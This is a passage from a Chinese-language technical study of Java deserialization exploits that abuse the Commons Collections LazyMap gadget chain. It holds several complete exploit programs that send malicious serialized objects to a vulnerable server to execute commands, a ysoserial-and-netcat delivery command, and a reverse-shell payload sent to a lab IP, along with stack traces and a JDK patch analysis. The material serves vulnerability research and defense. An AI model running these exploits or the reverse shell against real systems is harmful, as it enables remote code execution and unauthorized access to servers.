                    String.class,
                    Class[].class
                },
                new Object[]
                {
                    "getRuntime",
                    new Class[0]
                }
            ),
            new InvokerTransformer
            (
                "invoke",
                new Class[]
                {
                    Object.class,
                    Object[].class
                },
                new Object[]
                {
                    null,
                    new Object[0]
                }
            ),
            new InvokerTransformer
            (
                "exec",
                new Class[]
                {
                    String[].class
                },
                new Object[]
                {
                    new String[]
                    {
                        "/bin/bash",
                        "-c",
                        cmd
                    }
                }
            )
        };
        Transformer         tchain      = new ChainedTransformer( tarray );
        Map                 normalMap   = new HashMap();
        Map                 lazyMap     = LazyMap.decorate( normalMap, tchain );
        Class               clazz       = Class.forName( "sun.reflect.annotation.AnnotationInvocationHandler" );
        Constructor         cons        = clazz.getDeclaredConstructor( Class.class, Map.class );
        cons.setAccessible( true );
        /*
         * https://docs.oracle.com/javase/8/docs/api/java/lang/Override.html
         *
         * Override是Annotation的子接口，且是public的
         */
        InvocationHandler   ih          = ( InvocationHandler )cons.newInstance( Override.class, lazyMap );
        /*
         * https://docs.oracle.com/javase/8/docs/api/java/util/Map.html
         *
         * Map是个接口，因此可以使用动态代理机制。参看:
         *
         * http://scz.617.cn/misc/201911291425.txt
         *
         * 2.2) TicketServiceClient1.java
         */
        Map                 mapProxy    = ( Map )Proxy.newProxyInstance
        (
            Map.class.getClassLoader(),
            new  Class[] { Map.class },
            ih
        );
        Object              obj         = cons.newInstance( Override.class, mapProxy );
        Socket              s_connect   = new Socket( addr, port );
        ObjectOutputStream  oos         = new ObjectOutputStream( s_connect.getOutputStream() );
        oos.writeObject( obj );
        oos.close();
        s_connect.close();
    }
}
```

8.3.3) 测试

执行服务端:

java_8_40 \
-cp "commons-collections-3.1.jar:." \
VulnerableServer 192.168.65.23 1414

执行客户端:

java \
-cp "commons-collections-3.1.jar:." \
EvilClientWithLazyMap 192.168.65.23 1414 "/bin/touch /tmp/scz_is_here"

得手时服务端抛出异常:

Exception in thread "main" java.lang.ClassCastException: java.lang.UNIXProcess cannot be cast to java.util.Set
        at com.sun.proxy.$Proxy0.entrySet(Unknown Source)
        at sun.reflect.annotation.AnnotationInvocationHandler.readObject(AnnotationInvocationHandler.java:444)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.lang.reflect.Method.invoke(Method.java:497)
        at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1017)
        at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:1896)
        at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1801)
        at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1351)
        at java.io.ObjectInputStream.readObject(ObjectInputStream.java:371)
        at VulnerableServer.main(VulnerableServer.java:22)

但恶意命令已被执行。

调试VulnerableServer:

java_8_40 -agentlib:jdwp=transport=dt_socket,address=192.168.65.23:8005,server=y,suspend=y \
-cp "commons-collections-3.1.jar:." \
VulnerableServer 192.168.65.23 1414

jdb -connect com.sun.jdi.SocketAttach:hostname=192.168.65.23,port=8005

stop in java.lang.Runtime.exec(java.lang.String[])

  [1] java.lang.Runtime.exec (Runtime.java:485), pc = 0
  [2] sun.reflect.NativeMethodAccessorImpl.invoke0 (native method)
  [3] sun.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62), pc = 100
  [4] sun.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43), pc = 6
  [5] java.lang.reflect.Method.invoke (Method.java:497), pc = 56
  [6] org.apache.commons.collections.functors.InvokerTransformer.transform (InvokerTransformer.java:125), pc = 30
  [7] org.apache.commons.collections.functors.ChainedTransformer.transform (ChainedTransformer.java:122), pc = 12
  [8] org.apache.commons.collections.map.LazyMap.get (LazyMap.java:151), pc = 18
  [9] sun.reflect.annotation.AnnotationInvocationHandler.invoke (AnnotationInvocationHandler.java:77), pc = 204
  [10] com.sun.proxy.$Proxy0.entrySet (null), pc = 9
  [11] sun.reflect.annotation.AnnotationInvocationHandler.readObject (AnnotationInvocationHandler.java:444), pc = 37
  [12] sun.reflect.NativeMethodAccessorImpl.invoke0 (native method)
  [13] sun.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62), pc = 100
  [14] sun.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43), pc = 6
  [15] java.lang.reflect.Method.invoke (Method.java:497), pc = 56
  [16] java.io.ObjectStreamClass.invokeReadObject (ObjectStreamClass.java:1,017), pc = 20
  [17] java.io.ObjectInputStream.readSerialData (ObjectInputStream.java:1,896), pc = 93
  [18] java.io.ObjectInputStream.readOrdinaryObject (ObjectInputStream.java:1,801), pc = 181
  [19] java.io.ObjectInputStream.readObject0 (ObjectInputStream.java:1,351), pc = 389
  [20] java.io.ObjectInputStream.readObject (ObjectInputStream.java:371), pc = 19
  [21] VulnerableServer.main (VulnerableServer.java:22), pc = 51

这是8u40的调用栈回溯。1至8号栈帧与8u232下LazyMapExec的调用栈基本一致。

```java
*
 * 用JD-GUI看8u40的rt.jar
 */
  private void readObject(ObjectInputStream paramObjectInputStream)
    throws IOException, ClassNotFoundException
  {
    paramObjectInputStream.defaultReadObject();

    AnnotationType localAnnotationType = null;
    try
    {
      localAnnotationType = AnnotationType.getInstance(this.type);
    }
    catch (IllegalArgumentException localIllegalArgumentException)
    {
      throw new InvalidObjectException("Non-annotation type in annotation serial stream");
    }
    Map localMap = localAnnotationType.memberTypes();
/*
 * 444行，11号栈帧所在，此时memberValues对应客户端的mapProxy，调用
 * entrySet()时流程将转至客户端指定的ih的invoke()，也即9号栈帧所在。关于动
 * 态代理机制，参看:
 *
 * http://scz.617.cn/misc/201911291425.txt
 */
    for (Map.Entry localEntry : this.memberValues.entrySet())
    {
      String str = (String)localEntry.getKey();
      Class localClass = (Class)localMap.get(str);
      if (localClass != null)
      {
        Object localObject = localEntry.getValue();
        if ((!localClass.isInstance(localObject)) && (!(localObject instanceof ExceptionProxy))) {
          localEntry.setValue(new AnnotationTypeMismatchExceptionProxy(localObject

            .getClass() + "[" + localObject + "]").setMember(
            (Method)localAnnotationType.members().get(str)));
        }
      }
    }
  }
```java
*
 * 用JD-GUI看8u40的rt.jar
 */
  public Object invoke(Object paramObject, Method paramMethod, Object[] paramArrayOfObject)
  {
/*
 * 57行，str等于方法名"entrySet"
 */
    String str = paramMethod.getName();
    Class[] arrayOfClass = paramMethod.getParameterTypes();
    if ((str.equals("equals")) && (arrayOfClass.length == 1) && (arrayOfClass[0] == Object.class)) {
      return equalsImpl(paramArrayOfObject[0]);
    }
    if (arrayOfClass.length != 0) {
      throw new AssertionError("Too many parameters for an annotation method");
    }
    Object localObject = str;int i = -1;
/*
 * 只要方法名不是"toString"、"hashCode"、"annotationType"，流程就会到达77
 * 行
 */
    switch (((String)localObject).hashCode())
    {
    case -1776922004:
      if (((String)localObject).equals("toString")) {
        i = 0;
      }
      break;
    case 147696667:
      if (((String)localObject).equals("hashCode")) {
        i = 1;
      }
      break;
    case 1444986633:
      if (((String)localObject).equals("annotationType")) {
        i = 2;
      }
      break;
    }
    switch (i)
    {
    case 0:
      return toStringImpl();
    case 1:
      return Integer.valueOf(hashCodeImpl());
    case 2:
      return this.type;
    }
/*
 * 77行，9号栈帧所在，此时memberValues对应客户端的lazyMap，str等于方法名
 * "entrySet"。客户端的lazyMap是空的，所以无论str是什么都无所谓，肯定触发
 * 对transform()的调用。一旦可以触发对transform()的调用，后面就是
 * LazyMapExec所演示的那样了，不再重复介绍。
 */
    localObject = this.memberValues.get(str);
    if (localObject == null) {
      throw new IncompleteAnnotationException(this.type, str);
    }
    if ((localObject instanceof ExceptionProxy)) {
      throw ((ExceptionProxy)localObject).generateException();
    }
    if ((localObject.getClass().isArray()) && (Array.getLength(localObject) != 0)) {
      localObject = cloneArray(localObject);
    }
    return localObject;
  }
```

8.3.4) 简化版调用关系

--------------------------------------------------------------------------
ObjectInputStream.readObject
    AnnotationInvocationHandler.readObject
        Map($Proxy0).entrySet
            AnnotationInvocationHandler.invoke
                LazyMap.get
                    ChainedTransformer.transform
--------------------------------------------------------------------------

两次出现AnnotationInvocationHandler，但它们的地位不同。第一次出现，是作为
反序列化目标。第二次出现，是作为动态代理机制中的InvocationHandler。理论上
二者不必一致。

8.3.5) AnnotationInvocationHandler()第一形参还能使用其他接口吗

基本上你能看到的PoC，第一形参都是Override。但实际上，对于LazyMap利用链，只
要是Annotation的子接口，且是public的，就可以用于第一形参。在exec()之前针对
这个第一形参，没有更多其他检查。比如这些都符合要求:

java.lang.Override
java.lang.annotation.Documented
java.lang.annotation.Inherited
java.lang.annotation.Native
java.lang.annotation.Retention
java.lang.annotation.Target
java.lang.annotation.Repeatable

在LazyMap利用链中接着用Retention没问题。

8.3.6) EvilClientWithLazyMap2.java

演示确认Override之外的其他接口亦可用，没有其他意图。此处略。

8.3.7) EvilClientWithLazyMap3.java

演示确认接着用Retention没问题。此处略。

8.3.8) ysoserial/CommonsCollections1

参[52]，可以用ysoserial生成使用LazyMap利用链的序列化数据。据说3.1至3.2.1都
可以。

执行服务端:

java_8_40 \
-cp "commons-collections-3.1.jar:." \
VulnerableServer 192.168.65.23 1414

执行客户端:

java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections1 "/bin/touch /tmp/scz_is_here" | nc -n 192.168.65.23 1414

得手时服务端抛出异常:

Exception in thread "main" java.lang.ClassCastException: java.lang.Integer cannot be cast to java.util.Set
        at com.sun.proxy.$Proxy0.entrySet(Unknown Source)
        at sun.reflect.annotation.AnnotationInvocationHandler.readObject(AnnotationInvocationHandler.java:444)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.lang.reflect.Method.invoke(Method.java:497)
        at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1017)
        at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:1896)
        at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1801)
        at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1351)
        at java.io.ObjectInputStream.readObject(ObjectInputStream.java:371)
        at VulnerableServer.main(VulnerableServer.java:22)

但恶意命令已被执行。

参:

https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java

从源码可以看出"ysoserial/CommonsCollections1"对应LazyMap利用链。用JD-GUI看
ysoserial-0.0.6-SNAPSHOT-all.jar可能更方便。

注意，CommonsCollections1用的是exec(String)，不是exec(String[])，这无谓地
增加了一些障碍，为了执行复杂命令，需要更多奇技淫巧，而本来并不需要的。参看
"Java执行外部命令"的讨论。感兴趣者可以搜一下"java.util.StringTokenizer"、
"Bash Brace Expansion"。

8.3.9) 8u232为什么失败

执行服务端:

java \
-cp "commons-collections-3.1.jar:." \
VulnerableServer 192.168.65.23 1414

执行客户端:

java \
-cp "commons-collections-3.1.jar:." \
EvilClientWithLazyMap 192.168.65.23 1414 "/bin/touch /tmp/scz_is_here"

未能得手，服务端抛出异常:

Exception in thread "main" java.lang.annotation.IncompleteAnnotationException: java.lang.Override missing element entrySet
        at sun.reflect.annotation.AnnotationInvocationHandler.invoke(AnnotationInvocationHandler.java:81)
        at com.sun.proxy.$Proxy0.entrySet(Unknown Source)
        at sun.reflect.annotation.AnnotationInvocationHandler.readObject(AnnotationInvocationHandler.java:452)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.lang.reflect.Method.invoke(Method.java:498)
        at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1170)
        at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:2177)
        at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2068)
        at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1572)
        at java.io.ObjectInputStream.readObject(ObjectInputStream.java:430)
        at VulnerableServer.main(VulnerableServer.java:22)

调试VulnerableServer:

java -agentlib:jdwp=transport=dt_socket,address=192.168.65.23:8005,server=y,suspend=y \
-cp "commons-collections-3.1.jar:." \
VulnerableServer 192.168.65.23 1414

jdb -connect com.sun.jdi.SocketAttach:hostname=192.168.65.23,port=8005

没有深究8u232失败的根本原因，只是看了看invoke()、readObject()的变化。

```java
*
 * 用JD-GUI看8u232的rt.jar
 */
  public Object invoke(Object proxy, Method method, Object[] args)
  {
    String member = method.getName();
    Class<?>[] paramTypes = method.getParameterTypes();
    if ((member.equals("equals")) && (paramTypes.length == 1) && (paramTypes[0] == Object.class)) {
      return equalsImpl(args[0]);
    }
    if (paramTypes.length != 0) {
      throw new AssertionError("Too many parameters for an annotation method");
    }
    switch (member)
    {
    case "toString":
      return toStringImpl();
    case "hashCode":
      return Integer.valueOf(hashCodeImpl());
    case "annotationType":
      return this.type;
    }
/*
 * 78行，对于8u232此时memberValues不是LazyMap，而是LinkedHashMap。首先不可
 * 能触发LazyMap.get()，其次导致result返回null。
 */
    Object result = this.memberValues.get(member);
    if (result == null) {
/*
 * 81行，在此抛出异常
 */
      throw new IncompleteAnnotationException(this.type, member);
    }
    if ((result instanceof ExceptionProxy)) {
      throw ((ExceptionProxy)result).generateException();
    }
    if ((result.getClass().isArray()) && (Array.getLength(result) != 0)) {
      result = cloneArray(result);
    }
    return result;
  }
```java
*
 * 用JD-GUI看8u232的rt.jar
 */
  private void readObject(ObjectInputStream s)
    throws IOException, ClassNotFoundException
  {
    ObjectInputStream.GetField fields = s.readFields();

    Class<? extends Annotation> t = (Class)fields.get("type", null);
/*
 * 434行，对于8u232此时this.memberValues等于null。会两次经过此处，本行代码
 * 使得streamVals依次对应LazyMap、$Proxy0。
 */
    Map<String, Object> streamVals = (Map)fields.get("memberValues", null);

    AnnotationType annotationType = null;
    try
    {
      annotationType = AnnotationType.getInstance(t);
    }
    catch (IllegalArgumentException e)
    {
      throw new InvalidObjectException("Non-annotation type in annotation serial stream");
    }
    Map<String, Class<?>> memberTypes = annotationType.memberTypes();

    Map<String, Object> mv = new LinkedHashMap();
/*
 * 452行，对于8u232此时调用entrySet()的对象是局部变量streamVals，而不是成
 * 员变量this.memberValues。会两次经过此处，streamVals分别对应LazyMap、
 * $Proxy0。
 */
    for (Map.Entry<String, Object> memberValue : streamVals.entrySet())
    {
      String name = (String)memberValue.getKey();
      Object value = null;
      Class<?> memberType = (Class)memberTypes.get(name);
      if (memberType != null)
      {
        value = memberValue.getValue();
        if ((!memberType.isInstance(value)) && (!(value instanceof ExceptionProxy))) {
          value = new AnnotationTypeMismatchExceptionProxy(value.getClass() + "[" + value + "]").setMember(
            (Method)annotationType.members().get(name));
        }
      }
      mv.put(name, value);
    }
    UnsafeAccessor.setType(this, t);
    UnsafeAccessor.setMemberValues(this, mv);
  }
```

从8u72开始抛类似异常，参:

https://github.com/frohoff/ysoserial/issues/17

在此讨论中有人指出"ConcurrentHashMap+TiedMapEntry"利用链。

8.3.10) commons-collections4-4.0的变化

4.0的LazyMap删除了:

public static Map decorate(Map map, Transformer factory)

但4.0增加了:

public static <V, K> LazyMap<K, V> lazyMap(Map<K, V> map, Transformer<? super K, ? extends V> factory)

攻击代码需要相应修改。

8.3.11) EvilClientWithLazyMap4.java

使用4.0版本。

```java
*
 * javac -encoding GBK -g -cp "commons-collections4-4.0.jar" EvilClientWithLazyMap4.java
 */
import java.io.*;
import java.net.Socket;
import java.util.*;
import java.lang.reflect.*;
import java.lang.annotation.*;
/*
 * package名有变化
 */
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.*;
import org.apache.commons.collections4.map.LazyMap;

public class EvilClientWithLazyMap4
{
    @SuppressWarnings("unchecked")
    public static void main ( String[] argv ) throws Exception
    {
        String              addr        = argv[0];
        int                 port        = Integer.parseInt( argv[1] );
        String              cmd         = argv[2];
        Transformer[]       tarray      = new Transformer[]
        {
            new ConstantTransformer( Runtime.class ),
            new InvokerTransformer
            (
                "getMethod",
                new Class[]
                {
                    String.class,
                    Class[].class
                },
                new Object[]
                {
                    "getRuntime",
                    new Class[0]
                }
            ),
            new InvokerTransformer
            (
                "invoke",
                new Class[]
                {
                    Object.class,
                    Object[].class
                },
                new Object[]
                {
                    null,
                    new Object[0]
                }
            ),
            new InvokerTransformer
            (
                "exec",
                new Class[]
                {
                    String[].class
                },
                new Object[]
                {
                    new String[]
                    {
                        "/bin/bash",
                        "-c",
                        cmd
                    }
                }
            )
        };
        Transformer         tchain      = new ChainedTransformer( tarray );
        Map                 normalMap   = new HashMap();
        /*
         * 4.0的LazyMap删除了decorate()，增加了lazyMap()
         */
        Map                 lazyMap     = LazyMap.lazyMap( normalMap, tchain );
        Class               clazz       = Class.forName( "sun.reflect.annotation.AnnotationInvocationHandler" );
        Constructor         cons        = clazz.getDeclaredConstructor( Class.class, Map.class );
        cons.setAccessible( true );
        InvocationHandler   ih          = ( InvocationHandler )cons.newInstance( Retention.class, lazyMap );
        Map                 mapProxy    = ( Map )Proxy.newProxyInstance
        (
            Map.class.getClassLoader(),
            new  Class[] { Map.class },
            ih
        );
        Object              obj         = cons.newInstance( Retention.class, mapProxy );
        Socket              s_connect   = new Socket( addr, port );
        ObjectOutputStream  oos         = new ObjectOutputStream( s_connect.getOutputStream() );
        oos.writeObject( obj );
        oos.close();
        s_connect.close();
    }
}
```

nc -l -p 7474

java_8_40 \
-cp "commons-collections4-4.0.jar:." \
VulnerableServer 192.168.65.23 1414

java \
-cp "commons-collections4-4.0.jar:." \
EvilClientWithLazyMap4 192.168.65.23 1414 "/bin/sh -i > /dev/tcp/192.168.65.23/7474 0<&1 2>&1"

ps -f -o pid,user,args

调试VulnerableServer:

java_8_40 -agentlib:jdwp=transport=dt_socket,address=192.168.65.23:8005,server=y,suspend=y \
-cp "commons-collections4-4.0.jar:." \
VulnerableServer 192.168.65.23 1414

jdb -connect com.sun.jdi.SocketAttach:hostname=192.168.65.23,port=8005

stop in java.lang.Runtime.exec(java.lang.String[])

  [1] java.lang.Runtime.exec (Runtime.java:485), pc = 0
  [2] sun.reflect.NativeMethodAccessorImpl.invoke0 (native method)
  [3] sun.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62), pc = 100
  [4] sun.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43), pc = 6
  [5] java.lang.reflect.Method.invoke (Method.java:497), pc = 56
  [6] org.apache.commons.collections4.functors.InvokerTransformer.transform (InvokerTransformer.java:129), pc = 30
  [7] org.apache.commons.collections4.functors.ChainedTransformer.transform (ChainedTransformer.java:112), pc = 26
  [8] org.apache.commons.collections4.map.LazyMap.get (LazyMap.java:165), pc = 20
  [9] sun.reflect.annotation.AnnotationInvocationHandler.invoke (AnnotationInvocationHandler.java:77), pc = 204
  [10] com.sun.proxy.$Proxy0.entrySet (null), pc = 9
  [11] sun.reflect.annotation.AnnotationInvocationHandler.readObject (AnnotationInvocationHandler.java:444), pc = 37
  [12] sun.reflect.NativeMethodAccessorImpl.invoke0 (native method)
  [13] sun.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62), pc = 100
  [14] sun.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43), pc = 6
  [15] java.lang.reflect.Method.invoke (Method.java:497), pc = 56
  [16] java.io.ObjectStreamClass.invokeReadObject (ObjectStreamClass.java:1,017), pc = 20
  [17] java.io.ObjectInputStream.readSerialData (ObjectInputStream.java:1,896), pc = 93
  [18] java.io.ObjectInputStream.readOrdinaryObject (ObjectInputStream.java:1,801), pc = 181
  [19] java.io.ObjectInputStream.readObject0 (ObjectInputStream.java:1,351), pc = 389
  [20] java.io.ObjectInputStream.readObject (ObjectInputStream.java:371), pc = 19
  [21] VulnerableServer.main (VulnerableServer.java:22), pc = 51

除了package名有些不同，4.0调用栈与3.1相比，没啥变化。

8.3.13) LazyMapExecWithHashtable.java

```java
*
 * javac -encoding GBK -g -cp "commons-collections-3.1.jar" LazyMapExecWithHashtable.java
 * java -cp "commons-collections-3.1.jar:." LazyMapExecWithHashtable "/bin/touch /tmp/scz_is_here"
 */
import java.io.*;
import java.util.*;
import java.lang.reflect.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.LazyMap;

/*
 * 从TiedMapEntryExecWithHashSet.java修改而来，这次没有用TiedMapEntry。
 */
public class LazyMapExecWithHashtable
{
    @SuppressWarnings("unchecked")
    public static void main ( String[] argv ) throws Exception
    {
        String          cmd         = argv[0];
        Transformer[]   tarray      = new Transformer[]
        {
            new ConstantTransformer( Runtime.class ),
            new InvokerTransformer
            (
                "getMethod",
                new Class[]
                {
                    String.class,
                    Class[].class
                },
                new Object[]
                {
                    "getRuntime",
                    new Class[0]
                }
            ),
            new InvokerTransformer
            (
                "invoke",
                new Class[]
                {
                    Object.class,
                    Object[].class
                },
                new Object[]
                {
                    null,
                    new Object[0]
                }
            ),
            new InvokerTransformer
            (
                "exec",
                new Class[]
                {
                    String[].class
                },
                new Object[]
                {
                    new String[]
                    {
                        "/bin/bash",
                        "-c",
                        cmd
                    }
                }
            )
        };
        /*
         * 本例在数据准备阶段就会触发ChainedTransformer，必须先给它一个无
         * 害的初始值，不要一上来就将第一形参指定成tarray。下面这两个是一
         * 回事:
         *
         * new Transformer[] {}
         * new Transformer[0]
         */
        Transformer     tchain      = new ChainedTransformer( new Transformer[0] );
        Map             normalMap_0 = new HashMap();
        Map             normalMap_1 = new HashMap();
        Map             lazyMap_0   = LazyMap.decorate( normalMap_0, tchain );
        Map             lazyMap_1   = LazyMap.decorate( normalMap_1, tchain );
        /*
         * Creating two LazyMaps with colliding hashes, in order to force
         * element comparison during readObject
         *
         * 需要key的哈希冲突，但key不能一样，否则将来Hashtable.put()时会合
         * 并，不会增加新项。
         *
         * 下面两个put()的第二形参必须一样，这与hashCode()的实现强相关
         *
         * "scz"、"tDz"的HASH都是113706，"same"的HASH是3522662
         *
         * 参看java.lang.String.hashCode()的实现
         */
        lazyMap_0.put( "scz", "same" );
        lazyMap_1.put( "tDz", "same" );
        Hashtable       ht          = new Hashtable();
        /*
         * Use the colliding Maps as keys in Hashtable
         *
         * 此处会提前触发ChainedTransformer.transform()
         *
         * Hashtable.put
         *   AbstractMapDecorator.equals
         *     AbstractMap.equals
         *       LazyMap.get
         *         ChainedTransformer.transform
         *
         * 第二形参可以是任意值，跟它没关系
         *
         * 参看java.util.HashMap$Node<K,V>.hashCode()的实现
         *
         * http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u232-ga/src/share/classes/java/util/HashMap.java
         *
         * return Objects.hashCode(key) ^ Objects.hashCode(value);
         *
         * lazyMap_0、lazyMap_1的HASH都是3439692，哈希冲突
         *
         * 113706 ^ 3522662 = 3439692
         */
        ht.put( lazyMap_0, "value_0" );
        /*
         * 此处会隐式调用:
         *
         * lazyMap_1.put( "scz", "scz" );
         *
         * 在Eclipse中针对"java.util.HashMap.put"设置条件断点:
         *
         * value.toString().equals("scz")
         *
         * 命中时调用栈回溯如下:
         *
         * java.util.HashMap<K,V>.put(K, V) line: 612
         * org.apache.commons.collections.map.LazyMap.get(java.lang.Object) line: 152
         * java.util.HashMap<K,V>(java.util.AbstractMap<K,V>).equals(java.lang.Object) line: 495
         * org.apache.commons.collections.map.LazyMap(org.apache.commons.collections.map.AbstractMapDecorator).equals(java.lang.Object) line: 129
         * java.util.Hashtable<K,V>.put(K, V) line: 470
         *
         * Hashtable.put
         *   AbstractMapDecorator.equals
         *     AbstractMap.equals
         *       LazyMap.get
         *         ChainedTransformer.transform
         *         HashMap.put
         */
        ht.put( lazyMap_1, "value_1" );
        /*
         * Needed to ensure hash collision after previous manipulations
         *
         * 为了让lazyMap_0、lazyMap_1的HASH一样，必须删掉隐式增加的"scz=scz"
         */
        lazyMap_1.remove( "scz" );
        /*
         * 通过反射方式设置tarray
         */
        Field           f           = ChainedTransformer.class.getDeclaredField( "iTransformers" );
        f.setAccessible( true );
        f.set( tchain, tarray );
        ByteArrayOutputStream
                        bos         = new ByteArrayOutputStream();
        ObjectOutputStream
                        oos         = new ObjectOutputStream( bos );
        oos.writeObject( ht );
        ByteArrayInputStream
                        bis         = new ByteArrayInputStream( bos.toByteArray() );
        ObjectInputStream
                        ois         = new ObjectInputStream( bis );
        /*
         * 通过反序列化HashSet触发LazyMap.get()
         */
        ois.readObject();
    }
}
```

java -agentlib:jdwp=transport=dt_socket,address=192.168.65.23:8005,server=y,suspend=y \
-cp "commons-collections-3.1.jar:." \
LazyMapExecWithHashtable "/bin/touch /tmp/scz_is_here"

jdb -connect com.sun.jdi.SocketAttach:hostname=192.168.65.23,port=8005

stop in org.apache.commons.collections.functors.ChainedTransformer.transform
stop in java.lang.Runtime.exec(java.lang.String[])

  [1] org.apache.commons.collections.functors.ChainedTransformer.transform (ChainedTransformer.java:121), pc = 0
  [2] org.apache.commons.collections.map.LazyMap.get (LazyMap.java:151), pc = 18
  [3] java.util.AbstractMap.equals (AbstractMap.java:495), pc = 118
  [4] org.apache.commons.collections.map.AbstractMapDecorator.equals (AbstractMapDecorator.java:129), pc = 12
  [5] java.util.Hashtable.put (Hashtable.java:470), pc = 60
  [6] LazyMapExecWithHashtable.main (LazyMapExecWithHashtable.java:147), pc = 245

  [1] org.apache.commons.collections.functors.ChainedTransformer.transform (ChainedTransformer.java:121), pc = 0
  [2] org.apache.commons.collections.map.LazyMap.get (LazyMap.java:151), pc = 18
  [3] java.util.AbstractMap.equals (AbstractMap.java:495), pc = 118
  [4] org.apache.commons.collections.map.AbstractMapDecorator.equals (AbstractMapDecorator.java:129), pc = 12
  [5] java.util.Hashtable.reconstitutionPut (Hashtable.java:1,241), pc = 55
  [6] java.util.Hashtable.readObject (Hashtable.java:1,215), pc = 228
  [7] sun.reflect.NativeMethodAccessorImpl.invoke0 (native method)
  [8] sun.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62), pc = 100
  [9] sun.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43), pc = 6
  [10] java.lang.reflect.Method.invoke (Method.java:498), pc = 56
  [11] java.io.ObjectStreamClass.invokeReadObject (ObjectStreamClass.java:1,170), pc = 24
  [12] java.io.ObjectInputStream.readSerialData (ObjectInputStream.java:2,177), pc = 119
  [13] java.io.ObjectInputStream.readOrdinaryObject (ObjectInputStream.java:2,068), pc = 183
  [14] java.io.ObjectInputStream.readObject0 (ObjectInputStream.java:1,572), pc = 401
  [15] java.io.ObjectInputStream.readObject (ObjectInputStream.java:430), pc = 19
  [16] LazyMapExecWithHashtable.main (LazyMapExecWithHashtable.java:172), pc = 335

第一个断点有两次命中。

  [1] java.lang.Runtime.exec (Runtime.java:485), pc = 0
  [2] sun.reflect.NativeMethodAccessorImpl.invoke0 (native method)
  [3] sun.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62), pc = 100
  [4] sun.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43), pc = 6
  [5] java.lang.reflect.Method.invoke (Method.java:498), pc = 56
  [6] org.apache.commons.collections.functors.InvokerTransformer.transform (InvokerTransformer.java:125), pc = 30
  [7] org.apache.commons.collections.functors.ChainedTransformer.transform (ChainedTransformer.java:122), pc = 12
  [8] org.apache.commons.collections.map.LazyMap.get (LazyMap.java:151), pc = 18
  [9] java.util.AbstractMap.equals (AbstractMap.java:495), pc = 118
  [10] org.apache.commons.collections.map.AbstractMapDecorator.equals (AbstractMapDecorator.java:129), pc = 12
  [11] java.util.Hashtable.reconstitutionPut (Hashtable.java:1,241), pc = 55
  [12] java.util.Hashtable.readObject (Hashtable.java:1,215), pc = 228
  [13] sun.reflect.NativeMethodAccessorImpl.invoke0 (native method)
  [14] sun.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62), pc = 100
  [15] sun.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43), pc = 6
  [16] java.lang.reflect.Method.invoke (Method.java:498), pc = 56
  [17] java.io.ObjectStreamClass.invokeReadObject (ObjectStreamClass.java:1,170), pc = 24
  [18] java.io.ObjectInputStream.readSerialData (ObjectInputStream.java:2,177), pc = 119
  [19] java.io.ObjectInputStream.readOrdinaryObject (ObjectInputStream.java:2,068), pc = 183
  [20] java.io.ObjectInputStream.readObject0 (ObjectInputStream.java:1,572), pc = 401
  [21] java.io.ObjectInputStream.readObject (ObjectInputStream.java:430), pc = 19
  [22] LazyMapExecWithHashtable.main (LazyMapExecWithHashtable.java:172), pc = 335

8.3.14) 简化版调用关系

--------------------------------------------------------------------------
ObjectInputStream.readObject
  Hashtable.readObject
    Hashtable.reconstitutionPut     // 1241行会先检查两个HashMap的哈希是否相等
                                    // 如果二者哈希不等，不会到达下面的流程
      AbstractMapDecorator.equals
        AbstractMap.equals
          LazyMap.get               // 此处开始LazyMap利用链
            ChainedTransformer.transform
              InvokerTransformer.transform
--------------------------------------------------------------------------

8.3.15) ysoserial/CommonsCollections7

参[52]，8u232可以得手。

https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections7.java

测试:

nc -l -p 7474

java \
-cp "commons-collections-3.1.jar:." \
